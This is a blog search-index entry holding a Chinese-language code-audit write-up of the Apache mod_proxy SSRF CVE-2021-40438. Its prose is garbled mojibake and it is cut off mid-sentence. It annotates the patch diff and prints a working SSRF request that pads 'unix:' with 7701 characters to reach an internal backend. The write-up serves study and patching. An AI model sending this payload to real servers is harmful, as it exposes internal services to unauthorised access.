<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2021-40438 Apache mod_proxy SSRF æ¼æ´åˆ†æ</title>
      <link href="/posts/368b3bb7/"/>
      <url>/posts/368b3bb7/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ–‡ç« é¦–å‘äºå®‰å…¨å®¢ã€‚</p></blockquote><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¤ç°è¿™ä¸ªæ¼æ´çš„è¿‡ç¨‹ä¸­è§‰å¾—å¾ˆæœ‰åˆ†æçš„å¿…è¦ï¼Œè€Œä½œè€…æºç ç»“åˆ log è°ƒè¯•åˆ†æçš„<a href="https://firzen.de/building-a-poc-for-cve-2021-40438">è¿™ç¯‡æ–‡ç« </a>å·²ç»å†™å¾—æ¯”è¾ƒè¯¦å°½äº†ï¼Œå°±æƒ³è‡ªå·±çº¯ä»å®¡è®¡çš„è§’åº¦å†™ä¸€ä¸‹åˆ†æå·©å›ºä¸€ä¸‹ã€‚</p><p>æ€»ä¹‹ï¼Œå¦‚æœ‰ä¸å½“ï¼Œçƒ¦è¯·è¯„è®ºæ‰è™«ï¼Œæˆ‘ä¼šåœ¨ç¬¬ä¸€æ—¶é—´å“åº”å¹¶è¯„è®ºæç¤ºï¼Œè°¢è°¢ã€‚</p><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><h3 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211209084402856.png" alt="image-20211209084402856" style="zoom:80%;" /><p>å¯æ„é€  uri ä½¿ mod_proxy è¯·æ±‚è½¬å‘ç»™å†…éƒ¨æœåŠ¡å™¨é€ æˆ SSRF ã€‚</p><h3 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h3><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211121200332290.png" alt="image-20211121200332290" style="zoom: 80%;" /><h3 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h3><p>ä»£å®¡ç¯èŠ‚ä¸ªäººå»ºè®®æ˜¯äº²æ‰‹ç¼–è¯‘è°ƒè¯• Apache è·Ÿè¿›ï¼Œå¯ä»¥å‚ç…§ P ç¥çš„æ•™ç¨‹ï¼š</p><p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/418885442584848">ç¼–è¯‘è°ƒè¯• Apache</a></p><p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/218882521544551">è°ƒè¯•è¡¥å……äº‹é¡¹</a></p><p>ä¸ä¸€å®šè¦ Ubantuï¼ŒKali ä¸Šç¬”è€…ä¹Ÿè°ƒè¯•æˆåŠŸäº†ï¼Œæœ€å¥½ç”¨ VSï¼Œå¦å¤–å¦‚æœä½ æƒ³å°è¯•ç”¨ CLionï¼Œå¯ä»¥å‚ç…§ä¸‹é¢çš„é“¾æ¥è¿›è¡Œ SSH è¿œç¨‹è°ƒè¯•ï¼Œå…¶ä½™æ­¥éª¤éƒ½åŒä¸Šä¸€æ ·ï¼š</p><p><a href="https://blog.jetbrains.com/clion/2018/09/initial-remote-dev-support-clion/">Stay local, let your IDE do remote work for you! | The CLion Blog (jetbrains.com)</a></p><p>CLion è°ƒè¯•éœ€è¦æ³¨æ„æœ‰ cmake å’Œ gdb ç‰ˆæœ¬é™åˆ¶ï¼Œæœ€å¥½ä¸è¦ä¸‹è½½æœ€æ–°ç‰ˆæœ¬é¿å…è¿˜è¦ç”¨è½¯é“¾æ¥é‡æ–°ä¸‹è½½æŸä¸€æŒ‡å®šç‰ˆæœ¬ï¼Œæˆ–è€…æ›´æ–° CLion ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p><h2 id="å‰ç½®å­¦ä¹ "><a href="#å‰ç½®å­¦ä¹ " class="headerlink" title="å‰ç½®å­¦ä¹ "></a>å‰ç½®å­¦ä¹ </h2><p>ä¸ºäº†ç†è§£æ¼æ´åŸç†ï¼Œç¬”è€…ä¸ªäººè®¤ä¸ºæ˜¯éœ€è¦ Apache å’Œ PHP ä¸€äº›å‰ç½®çŸ¥è¯†å­¦ä¹ çš„ï¼Œå°±ç®€å•æ¦‚æ‹¬äº†å¹¶ä½¿ä¹‹é€’è¿›åŠ æ·±ç†è§£ï¼Œå¾ˆå¤šç‚¹éƒ½ä¼šåœ¨åˆ†æè¿‡ç¨‹ä¸­ç”¨åˆ°ï¼Œè¡Œæ–‡ç»“åˆäº†è®¸å¤šå®˜æ–¹æ–‡æ¡£å’Œè‡ªèº«ç†è§£æ•´ç†ä»¥ç¡®ä¿å‡†ç¡®ï¼Œå¦‚æœ‰ç¼ºæ¼ä¸å½“ä¹‹å¤„ï¼Œè¿˜è¯·æŒ‡å‡ºã€‚</p><h3 id="Apache-éƒ¨ç½²-php"><a href="#Apache-éƒ¨ç½²-php" class="headerlink" title="Apache éƒ¨ç½² php"></a>Apache éƒ¨ç½² php</h3><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œphp æœ‰äº”ç§è¿è¡Œæ¨¡å¼ï¼Œå…¶ä¸­æœ€å¸¸è§çš„ä¸‰ç§ CGIã€FastCGIã€Module åŠ è½½æˆ–è€…è¯´ apache2handler æ›´ä¸ºæ°å½“ï¼ˆlinux ä¸‹ï¼‰ã€‚</p><p>Module åŠ è½½è¿™ç§æ¨¡å¼ä¸€èˆ¬å¯¹äº Apache è€Œè¨€ï¼Œç®€å•æ¥è¯´ï¼Œå°±æ˜¯æŠŠ PHP ä½œä¸º Apache çš„ä¸€ä¸ªå­æ¨¡å—æ¥è¿è¡Œï¼Œç”¨ LoadModule åŠ è½½æ¨¡å—ï¼Œæœ€ä¸»è¦çš„æ¨¡å—å°±æ˜¯ mod_phpï¼Œæ¼æ´å®éªŒç¯å¢ƒé…ç½®è°ƒè¯•ä¹Ÿæ˜¯ä»¥ LoadModule åŠ è½½ mod_proxy çš„ã€‚</p><p>è€Œ FastCGI è¿™ä¸ªæ¨¡å¼ä¸‹ä¼šç”¨åˆ° PHP-FPM è¿™ä¸ªè¿›ç¨‹ç®¡ç†å™¨è¿›è¡Œ FastCGI ç®¡ç†ï¼Œè€Œé CGI çš„ç”¨ Web æœåŠ¡å™¨ç®¡ç†ï¼Œå…¶ä¸­çš„å­è¿›ç¨‹å«åš PHP-CGI ï¼Œ<strong>è¿™æ¬¡æ¼æ´çš„çªç ´ç‚¹ mod_proxy å°±ä¸ PHP-FPM æœ‰å…³ï¼Œå®ƒä» PHP 5.3.3 å°±æˆä¸ºäº† PHP çš„å†…ç½®ç®¡ç†å™¨ï¼Œæ‰€ä»¥é…åˆè¿™ä¸ªä» Apache httpd 2.4.x æ¨å‡ºäº†ä½¿ç”¨ mod_proxy çš„å­æ¨¡å— mod_proxy_fcgi å’Œ PHP-FPM éƒ¨ç½²æ›´é«˜æ€§èƒ½çš„ PHP è¿è¡Œç¯å¢ƒã€‚</strong></p><p>è™½ç„¶ç°åœ¨æ˜æ˜¾ç”¨ Nginx+PHP-FPM æ˜¯æ›´å¥½çš„é€‰æ‹© :-)</p><h3 id="mod-proxy-åå‘ä»£ç†"><a href="#mod-proxy-åå‘ä»£ç†" class="headerlink" title="mod_proxy åå‘ä»£ç†"></a>mod_proxy åå‘ä»£ç†</h3><p>é¡¾åæ€ä¹‰ï¼Œè¿™ä¸ªæ¨¡å—ä¸å…¶ç›¸å…³æ¨¡å—ä¸º Apache HTTP Server å®ç°ä»£ç† / ç½‘å…³ã€‚</p><p>å‰é¢æœ‰è¯´åˆ° High-performance PHP on apache httpd 2.4.x using mod_proxy_fcgi and php-fpm è¿™ç§æ–¹å¼ï¼Œæœ¬è´¨å°±æ˜¯ Apache ä½œä¸ºåä»£æœåŠ¡å™¨ç”¨ mod_proxy_fcgi è¿™ä¸ªå­æ¨¡å—è¯·æ±‚è½¬å‘ç»™ PHP-FPM ï¼Œè€Œ PHP-FPM ç›‘å¬çš„æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯æ¥æ”¶ Apache è½¬è¿‡å»æ—¶å¤„ç† PHP çš„è¯·æ±‚çš„æ–¹å¼ï¼Œæœ‰ä¸¤ç§ï¼š</p><ol><li><p>TCP Socketï¼ˆip and portï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ProxyPass / http://www.example.com:port</span><br></pre></td></tr></table></figure></li><li><p>UDS ï¼ˆUnix Domain Socketï¼‰ </p><p><strong>åªåœ¨Apache 2.4.7 åŠæ›´é«˜ç‰ˆæœ¬ä¸­æ”¯æŒã€‚</strong></p><p>å¯ä»¥é€šè¿‡ä½¿ç”¨ä½äº <code>unix:/path/app.sock|</code> å‰é¢çš„ç›®æ ‡æ¥æ”¯æŒä½¿ç”¨ UDS ã€‚ä¾‹å¦‚ï¼Œè¦ä»£ç† HTTP å¹¶å°† UDS å®šä½äº /home/<a href="http://www.socket/">www.socket</a> ï¼Œåº”ä½¿ç”¨ <code>unix:/home/www.socket|http://localhost/whatever/</code> ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ProxyPass / unix:/path/to/app.sock|http://example.com/app/name</span><br></pre></td></tr></table></figure></li></ol><p>å¯¹äºåå‘ä»£ç†è€Œè¨€ï¼Œ Apache è½¬å‘ä»£ç†ï¼Œä¹Ÿå°±æ˜¯ Apache å‘é€è¯·æ±‚ç»™ PHP-FPM çš„æ–¹å¼æœ‰ä¸‰ç§ï¼Œå…¶ä¸­ä¸€ç§å« ProxyPass ï¼Œè¿™æ˜¯æŒ‡ä»¤ï¼Œå…è®¸å°†è¿œç¨‹æœåŠ¡å™¨ Map åˆ°æœ¬åœ°æœåŠ¡å™¨ï¼ˆåå‘ä»£ç† / ç½‘å…³ï¼‰çš„ç©ºé—´ï¼Œå¯¹äºä¸åŒç›‘å¬æ–¹å¼çš„æŒ‡ä»¤ä¾‹å­å¦‚ä¸Šæ‰€ç¤ºã€‚</p><h3 id="Apache-hook-æœºåˆ¶"><a href="#Apache-hook-æœºåˆ¶" class="headerlink" title="Apache hook æœºåˆ¶"></a>Apache hook æœºåˆ¶</h3><p>è¯´èµ· Apache Module ä¸èƒ½ä¸æèµ· Apache hookï¼Œæƒ³è¦å¤„ç†è¯·æ±‚ï¼Œè¦åšçš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯åœ¨è¯·æ±‚å¤„ç†è¿‡ç¨‹ä¸­åˆ›å»ºä¸€ä¸ª hookï¼Œæ‰€æœ‰å¤„ç†ç¨‹åºï¼Œå°±æ¯”å¦‚æˆ‘ä»¬ä¸Šé¢è¯´åˆ°çš„ mod_proxy ï¼Œéƒ½ä¼šè¢«æŒ‚æ¥åˆ°è¯·æ±‚è¿‡ç¨‹çš„ç‰¹å®šéƒ¨åˆ†ã€‚æœåŠ¡å™¨æœ¬èº«æ˜¯ä¸çŸ¥é“å“ªä¸ªæ¨¡å—è´Ÿè´£å¤„ç†ç‰¹å®šè¯·æ±‚çš„ï¼Œæ‰€ä»¥ä¼šè¯¢é—®æ¯ä¸ªæ¨¡å—æ˜¯å¦å¯¹ç»™å®šè¯·æ±‚æ„Ÿå…´è¶£ã€‚ç„¶åï¼Œç”±æ¯ä¸ªæ¨¡å—å†³å®šæ˜¯å¦åƒèº«ä»½éªŒè¯ / æˆæƒæ¨¡å—é‚£æ ·æ‹’ç»æœåŠ¡è¯·æ±‚ï¼Œæ¥å—æœåŠ¡è¯·æ±‚æˆ–æ‹’ç»æœåŠ¡è¯·æ±‚ï¼Œå°±åƒä¸‹å›¾ä¸€æ ·ã€‚</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211214095139626.png" alt="image-20211214095139626" style="zoom:80%;" /><p>ä¸ºäº†ä½¿è¯¸å¦‚ mod_example ä¹‹ç±»çš„å¤„ç†ç¨‹åºæ›´å®¹æ˜“çŸ¥é“ Client ç«¯æ˜¯å¦åœ¨è¯·æ±‚æˆ‘ä»¬åº”å¤„ç†çš„å†…å®¹ï¼ŒæœåŠ¡å™¨å…·æœ‰ç”¨äºå‘æ¨¡å—æç¤ºæ˜¯å¦éœ€è¦å…¶ååŠ©çš„æŒ‡ä»¤ã€‚å…¶ä¸­ä¸¤ä¸ªæ˜¯ <a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-mod_mime.html#addhandler">AddHandler</a> å’Œ <a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-core.html#sethandler">SetHandler</a>ã€‚</p><p>ä¸ºæ­¤å¯ä»¥çœ‹ä¸€ä¸ªä¾‹å­ç†è§£ï¼Œæ¯”å¦‚æˆ‘ä»¬æƒ³é€šè¿‡åˆ›å»ºåˆé€‚çš„ Handler ä¼ é€’ï¼Œå°†è¯·æ±‚å¼ºåˆ¶å¤„ç†ä¸ºåå‘ä»£ç†è¯·æ±‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.php$&quot;&gt;</span><br><span class="line">    # Unix sockets require 2.4.7 or later</span><br><span class="line">    SetHandler  &quot;proxy:unix:/path/to/app.sock|fcgi://localhost/&quot;</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¾‹å­æ˜¯ä½¿ç”¨åå‘ä»£ç†å°†å¯¹ PHP è„šæœ¬çš„æ‰€æœ‰è¯·æ±‚ä¼ é€’åˆ°æŒ‡å®šçš„ FastCGI æœåŠ¡å™¨ï¼Œæ˜¯ä¸æ˜¯å’Œä¹‹å‰ UDS çš„ä¾‹å­å¾ˆåƒï¼Ÿ</p><p>ä¸€ä¸ª Module é€šå¸¸æ˜¯åœ¨ Handler ä¸­åˆ›å»ºä¸€ä¸ª hookï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">register_hooks</span><span class="params">(<span class="keyword">apr_pool_t</span> *pool)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* Create a hook in the request handler, so we get called when a request arrives */</span></span><br><span class="line">    ap_hook_handler(example_handler, <span class="literal">NULL</span>, <span class="literal">NULL</span>, APR_HOOK_LAST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚ä¸Šï¼Œç»§è€Œå°±ä¼šåœ¨ example_handler è¿™ä¸ªå‡½æ•°ä¸­å¤„ç†è¯·æ±‚ï¼Œmod_proxy ä¹Ÿæœ‰è¿™æ ·çš„ Handler ã€‚</p><p>å¦å¤–è¿˜è¦æåˆ°çš„å°±æ˜¯ request_rec ç»“æ„ã€‚</p><p>ä»»ä½•è¯·æ±‚ä¸­æœ€é‡è¦çš„éƒ¨åˆ†æ˜¯ request record ã€‚åœ¨å¯¹å¤„ç†ç¨‹åºå‡½æ•°çš„è°ƒç”¨ä¸­ï¼Œè¿™ç”±ä¸è¿›è¡Œçš„æ¯æ¬¡è°ƒç”¨ä¸€èµ·ä¼ é€’çš„ <code>request_rec*</code> ç»“æ„è¡¨ç¤ºã€‚è¯¥ç»“æ„åœ¨æ¨¡å—ä¸­é€šå¸¸ç®€ç§°ä¸º <code>r</code> ï¼ŒåŒ…å«æ¨¡å—å®Œå…¨å¤„ç†ä»»ä½• HTTP è¯·æ±‚å¹¶ç›¸åº”åšå‡ºå“åº”æ‰€éœ€çš„æ‰€æœ‰ä¿¡æ¯ã€‚</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211214102827262.png" alt="image-20211214102827262" style="zoom:80%;" /><p>å…¶ä¸­è¿™ä¸ª <code>r-&gt;filename</code> è¿˜æœ‰å…¶ä»–å‡ ä¸ªæˆ‘ä»¬å°±ä¼šåœ¨åˆ†æè¿‡ç¨‹ä¸­æ¥è§¦åˆ°ã€‚</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h3 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h3><p>ä»¥ Apache 2.4.48 æºä»£ç å®¡è®¡ï¼Œ<strong>ä¸åŒç‰ˆæœ¬ä¼šæœ‰äº›å‡ºå…¥</strong>ã€‚</p><p><strong>æ³¨æ„å®¡è®¡è¿™éƒ¨åˆ†ç€é‡çœ‹ä»£ç ä¸­çš„æ³¨é‡Šï¼Œç¬”è€…æ‰€å†™çš„æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†è§£é‡Šå’Œåˆ†æéƒ½åœ¨å…¶ä¸­ï¼Œä¿®å¤çš„éƒ¨åˆ†ä¼šæ ‡ * ï¼Œä¸€å®šè¦çœ‹æ³¨é‡Šé…åˆç†è§£ï¼</strong></p><p>[<a href="https://svn.apache.org/viewvc?view=revision&revision=1892814">Apache-SVN] Revision 1892814</a></p><p>ç›´æ¥æ¥çœ‹ä¿®å¤å‰åçš„å¯¹æ¯”åˆ†æç¼ºé™·åœ¨å“ªï¼Œè¿˜æœ‰æ¼æ´æœ¬è´¨ä¸Šæ˜¯ä»€ä¹ˆé—®é¢˜ã€‚</p><p>å®˜æ–¹çš„å‡½æ•°è§£é‡Šçœ‹è¿™ä¸ªæ–‡æ¡£ï¼š</p><p><a href="https://ci.apache.org/projects/httpd/trunk/doxygen/group__APACHE__CORE__DAEMON.html#gaa6a7169f7d3801b11d3b113b27284dbd">Apache2: HTTP Daemon Routine</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">--- httpd/httpd/trunk/modules/proxy/proxy_util.c    <span class="number">2021</span>/<span class="number">09</span>/<span class="number">02</span> <span class="number">12</span>:<span class="number">33</span>:<span class="number">49</span> <span class="number">1892813</span></span><br><span class="line">+++ httpd/httpd/trunk/modules/proxy/proxy_util.c    <span class="number">2021</span>/<span class="number">09</span>/<span class="number">02</span> <span class="number">12</span>:<span class="number">37</span>:<span class="number">02</span> <span class="number">1892814</span></span><br><span class="line">@@ <span class="number">-2274</span>,<span class="number">8</span> +<span class="number">2274</span>,<span class="number">8</span> @@ <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fix_uds_filename</span><span class="params">(request_rec *r, <span class="keyword">char</span> **url)</span></span>&#123;</span><br><span class="line">     <span class="keyword">char</span> *ptr, *ptr2;</span><br><span class="line">     <span class="keyword">if</span> (!r || !r-&gt;filename) <span class="keyword">return</span>;</span><br><span class="line">   </span><br><span class="line">     <span class="comment">// COND1ï¼šr-&gt;filename å‰ 6 ä¸ªå­—ç¬¦å¿…é¡»æ˜¯ proxy:</span></span><br><span class="line">     <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(r-&gt;filename, <span class="string">&quot;proxy:&quot;</span>, <span class="number">6</span>) &amp;&amp;</span><br><span class="line">             <span class="comment">// COND2ï¼šr-&gt;filename å¿…é¡»æœ‰ unix: è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œä½†ä¸åŒºåˆ†å¤§å°å†™ï¼Œè¿™ä¸åŒäº strstr</span></span><br><span class="line">-            (ptr2 = ap_strcasestr(r-&gt;filename, <span class="string">&quot;unix:&quot;</span>)) &amp;&amp;</span><br><span class="line">             <span class="comment">// COND3ï¼šCOND2 å¯¹ r-&gt;filename è¿›è¡Œäº†æˆªå–ï¼Œè¿™æ¡æ˜¯åˆ¤æ–­ unix: è¿™ä¸ªå­—ç¬¦ä¸²åçš„éƒ¨åˆ†æ˜¯å¦æœ‰ | </span></span><br><span class="line">-            (ptr = ap_strchr(ptr2, <span class="string">&#x27;|&#x27;</span>))) &#123;</span><br><span class="line">          <span class="comment">// *COND2ï¼šä¸åŒºåˆ†å¤§å°å†™å¯¹ä¸¤ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œ r-&gt;filename å¿…é¡»ä»¥ proxy:unix: å¼€å¤´</span></span><br><span class="line">+            !ap_cstr_casecmpn(r-&gt;filename + <span class="number">6</span>, <span class="string">&quot;unix:&quot;</span>, <span class="number">5</span>) &amp;&amp;</span><br><span class="line">     <span class="comment">// *COND3ï¼šptr2 æŒ‡ proxy:unix: åçš„éƒ¨åˆ†ï¼Œè¿™é‡Œåˆ¤æ–­å­—ç¬¦ä¸²ä¸­é‚£ä¸ªæ˜¯å¦æœ‰ | ï¼Œä¸ COND3 è¦æ±‚ä¸€è‡´</span></span><br><span class="line">+            (ptr2 = r-&gt;filename + <span class="number">6</span> + <span class="number">5</span>, ptr = ap_strchr(ptr2, <span class="string">&#x27;|&#x27;</span>))) &#123;</span><br><span class="line">    </span><br><span class="line">         <span class="keyword">apr_uri_t</span> urisock;</span><br><span class="line">         <span class="keyword">apr_status_t</span> rv;</span><br><span class="line">         *ptr = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">     <span class="comment">// ä¸¾ä¾‹ï¼šProxyPass / unix:/path/to/app.sock|http://example.com/app/name æˆ‘ä»¬æ¥çœ‹è¿™äº›å‚æ•°çš„å€¼</span></span><br><span class="line">         <span class="comment">// è¿™é‡Œè§£æç»™å®šçš„ uri ï¼Œå¡«å†™ apr_uri_t ç»“æ„çš„ä¸€äº›å­—æ®µï¼Œé¿å…é‡å¤æå–ä¸»æœºç«¯å£ã€è·¯å¾„è¿™äº›</span></span><br><span class="line">         rv = apr_uri_parse(r-&gt;pool, ptr2, &amp;urisock);</span><br><span class="line">     <span class="comment">// å¦‚æœè§£ææˆåŠŸï¼ˆapr_uri_parse Returns APR_SUCCESS for success or error codeï¼‰</span></span><br><span class="line">         <span class="keyword">if</span> (rv == APR_SUCCESS) &#123;</span><br><span class="line">             <span class="comment">// è¿™é‡Œ rurl å³ redirect url åœ¨ä¾‹å­ä¸­å°±æ˜¯ http://example.com/app/nameï¼Œéœ€è¦é‡å®šå‘åˆ°çš„åœ°å€</span></span><br><span class="line">             <span class="keyword">char</span> *rurl = ptr+<span class="number">1</span>;</span><br><span class="line">             <span class="comment">// è¿”å›ç›¸å¯¹è·¯å¾„ï¼Œåœ¨ä¾‹å­ä¸­ uds_path å°±æ˜¯ /path/to/app.sock</span></span><br><span class="line">             <span class="keyword">char</span> *sockpath = ap_runtime_dir_relative(r-&gt;pool, urisock.path);</span><br><span class="line">             <span class="comment">// å°† uds_path é”®å€¼å¯¹æ·»åŠ åˆ° r-&gt;notes</span></span><br><span class="line">             apr_table_setn(r-&gt;notes, <span class="string">&quot;uds_path&quot;</span>, sockpath);</span><br><span class="line">             *url = apr_pstrdup(r-&gt;pool, rurl); <span class="comment">/* so we get the scheme for the uds */</span></span><br><span class="line">             <span class="comment">/* r-&gt;filename starts w/ &quot;proxy:&quot;, so add after that */</span></span><br><span class="line">             memmove(r-&gt;filename+<span class="number">6</span>, rurl, <span class="built_in">strlen</span>(rurl)+<span class="number">1</span>);</span><br><span class="line">             <span class="comment">// è®°å½•ä¿¡æ¯</span></span><br><span class="line">             ap_log_rerror(APLOG_MARK, APLOG_TRACE2, <span class="number">0</span>, r,</span><br><span class="line">                     <span class="string">&quot;*: rewrite of url due to UDS(%s): %s (%s)&quot;</span>,</span><br><span class="line">                     sockpath, *url, r-&gt;filename);</span><br><span class="line">         &#125;</span><br><span class="line">    </span><br><span class="line">         <span class="keyword">else</span> &#123;</span><br><span class="line">             *ptr = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    </span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“åˆæ³¨è§£ï¼Œå¯ä»¥çœ‹å‡º <code>fix_uds_filename</code> è¿™ä¸ªå‡½æ•°æœ¬èº«å°±æ˜¯ç”¨äºè§£æå¹¶å¡«å†™ uri ï¼Œæ–‡ä»¶åæ ‡è¯† UDS ï¼Œç„¶åé€šè¿‡ç®¡é“ç¬¦ <code>|</code> åé¢çš„å†…å®¹é‡å®šå‘åˆ°å®ƒã€‚</p><p>å¯¹æ¯” COND2 å’Œ *COND2 ï¼Œæˆ‘ä»¬çŸ¥é“è¿™ä¸ªæ¼æ´çš„ä¿®å¤å°±æ˜¯å•çº¯å¼ºåˆ¶è¦æ±‚ <code>proxy:unix:</code> å¼€å¤´ï¼ŒCOND2 æˆ‘ä»¬ä¹Ÿèƒ½çœ‹å‡ºåªè¦æ˜¯æœ‰ <code>unix:</code> å­—æ ·è€Œä¸”ä¸è®ºå¤§å°å†™éƒ½èƒ½è¢«è§£æï¼Œæ˜¾ç„¶æ˜¯åˆ¤å®šå®½æ¾å‡ºäº†é—®é¢˜ï¼Œä¸ºäº†æ›´å¥½ç†è§£æˆ‘ä»¬å…ˆæ¥çœ‹ <a href="https://twitter.com/_mattata/status/1449020783989297167">remyğŸ€ åœ¨ Twitter: â€œCVE-2021-40438 Apache SSRF as a one-liner./ Twitter</a> ä¸Šçš„ä¸€ä¸ª poc ï¼š</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211214033514714.png" alt="image-20211214033514714" style="zoom: 67%;" /><p>å¯ä»¥çœ‹åˆ° <code>unix:</code> åå®ƒæ‹¼æ¥äº†å…± 7701 ä¸ªå­—ç¬¦çš„ A ï¼Œå¯ä»¥çŒœæƒ³è¿™å…¶ä¸­ä¸€å®šæœ‰ç¼“å†²åŒºæˆ–è€…é”™è¯¯å¤„ç†çš„é—®é¢˜ï¼Œæ¥çœ‹ä¿®å¤å‰æ‹¼æ¥çš„æ•ˆæœï¼Œå‡è®¾æˆ‘ä»¬å‘é€çš„è¯·æ±‚å¦‚ä¸‹ï¼Œæ˜¾ç„¶æ˜¯è®©ä»£ç†ä¸€ä¸ª http è¯·æ±‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/?unix:$(python3 -c &#x27;print(&quot;A&quot;*7701, end=&quot;&quot;)&#x27;)|http://backend_server1:8085/</span><br></pre></td></tr></table></figure><p>ä»£ç†è¯·æ±‚æ‹¼æ¥åï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy:http://localhost/?unix:$(python3 -c &#x27;print(&quot;A&quot;*7701, end=&quot;&quot;)&#x27;)|http://backend_server1:8085/</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±åˆå› ä¸ºåŒ…å« <code>unix:</code> ï¼Œæ»¡è¶³ COND2 ï¼Œ<strong>å°±ä» http è¯·æ±‚å˜æˆäº†æœ‰æ•ˆçš„ UDS ä»£ç†é‡å®šå‘è¯·æ±‚ã€‚</strong></p><p>è§£é‡Šåˆ°è¿™ï¼Œæˆ‘ä»¬æ˜ç™½é—®é¢˜æœ¬è´¨åï¼Œå…ˆæ¥åˆ†æä»€ä¹ˆæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œå†æ¥ä» UDS è§£æè¿‡ç¨‹ä¸Šåˆ†æä¸ºä»€ä¹ˆè¦æ‹¼æ¥å°†è¿‘ 7000 ä¸ªå­—ç¬¦æ‰èƒ½æ”»å‡»æˆåŠŸã€‚</p><h4 id="å“ªéƒ¨åˆ†æ˜¯å¯æ§çš„ï¼Ÿ"><a href="#å“ªéƒ¨åˆ†æ˜¯å¯æ§çš„ï¼Ÿ" class="headerlink" title="å“ªéƒ¨åˆ†æ˜¯å¯æ§çš„ï¼Ÿ"></a>å“ªéƒ¨åˆ†æ˜¯å¯æ§çš„ï¼Ÿ</h4><p>ä¹‹å‰åœ¨å‰ç½®çŸ¥è¯†å­¦ä¹ ä¸­ï¼Œç¬”è€…æœ‰æåˆ°è¿‡ mod_proxy æœ‰å®ƒå¤„ç†è¯·æ±‚çš„ 